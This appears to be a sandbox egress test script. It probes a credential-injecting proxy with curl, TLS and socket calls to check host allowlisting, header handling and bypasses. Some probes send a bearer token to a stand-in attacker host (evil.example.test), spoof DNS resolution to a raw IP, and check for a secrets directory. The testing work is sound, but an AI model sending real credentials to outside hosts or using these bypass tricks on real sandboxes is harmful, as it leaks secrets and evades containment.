"""Runs INSIDE the sandbox (python3 - < this file). Uses only what an unaware app
would: plain curl / sockets, no proxy settings. Prints one JSON document."""
import json
import os
import socket
import ssl
import subprocess

FA = os.environ.get("FAKEAPI_TOKEN", "")
CMD = os.environ.get("CMD_TOKEN", "")
R = {}


def curl(*args):
    for f in ("/tmp/body", "/tmp/hdrs"):
        if os.path.exists(f):
            os.remove(f)
    p = subprocess.run(["curl", "-sS", "-o", "/tmp/body", "-D", "/tmp/hdrs", "-w", "%{http_code}",
                        "--max-time", "10", *args], capture_output=True, text=True)
    read = lambda f: open(f, encoding="utf-8", errors="replace").read() if os.path.exists(f) else ""
    return {"code": p.stdout.strip(), "err": p.stderr.strip()[-300:],
            "body": read("/tmp/body")[:6000], "headers": read("/tmp/hdrs")[:3000]}


def tls_issuer(host, connect_to=None):
    try:
        s = socket.create_connection((connect_to or host, 443), timeout=5)
        t = ssl.create_default_context().wrap_socket(s, server_hostname=host)
        cert = t.getpeercert()
        t.close()
        return {"ok": True, "issuer": dict(x[0] for x in cert["issuer"])}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "err": repr(e)[:200]}


def tcp(host, port):
    try:
        socket.create_connection((host, port), timeout=3).close()
        return "connected"
    except Exception as e:  # noqa: BLE001
        return repr(e)[:120]


def udp(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    try:
        s.sendto(b"\x00" * 32, (host, port))
        s.recvfrom(16)
        return "received"
    except Exception as e:  # noqa: BLE001
        return repr(e)[:120]


AUTH = ["-H", f"Authorization: Bearer {FA}"]
R["proxy_env"] = {k: v for k, v in os.environ.items() if "proxy" in k.lower()}
R["placeholders"] = {k: os.environ.get(k) for k in ("FAKEAPI_TOKEN", "ENV_TOKEN", "CMD_TOKEN")}
R["secrets_dir_visible"] = os.path.exists("/run/secrets")
R["header"] = curl("https://api.example.test/v1/echo", *AUTH)
R["query"] = curl(f"https://api.example.test/v1/echo?key={FA}&x=1")
R["set_header"] = curl("https://api.example.test/env/echo", "-H", "X-Api-Key: agent-guess")
R["cmd"] = curl("https://api.example.test/cmd/echo", "-H", f"Authorization: {CMD}")
R["sse"] = curl("-N", "https://api.example.test/v1/stream", *AUTH)
R["post_json"] = curl("-X", "POST", "https://api.example.test/v1/chat", *AUTH,
                      "-H", "content-type: application/json", "--data", '{"q":"hi"}')
R["spoofed_ip"] = curl("--resolve", "api.example.test:443:1.1.1.1",
                       "https://api.example.test/v1/spoof", *AUTH)
R["exfil_denied_host"] = curl("https://evil.example.test/v1/echo", *AUTH)
R["exfil_intercepted_host"] = curl("https://intercepted.example.test/v1/echo", *AUTH)
R["intercepted_clean"] = curl("https://intercepted.example.test/hello")
R["wrong_path"] = curl("https://api.example.test/v2/echo", *AUTH)
R["wrong_method"] = curl("-X", "DELETE", "https://api.example.test/v1/echo", *AUTH)
R["plain_http"] = curl("http://api.example.test/v1/echo", *AUTH)
R["unlisted_host"] = curl("https://example.com/")
R["raw_ip"] = curl("https://1.1.1.1/")
R["tunnel"] = tls_issuer("tunnel.example.test")
R["tunnel_spoofed_ip"] = tls_issuer("tunnel.example.test", "1.1.1.1")
R["mitm"] = tls_issuer("api.example.test")
R["tcp_22"] = tcp("1.1.1.1", 22)
R["tcp_fakeapi_8443"] = tcp("api.example.test", 8443)
R["udp_443"] = udp("1.1.1.1", 443)
R["whoami"] = subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
print(json.dumps(R))
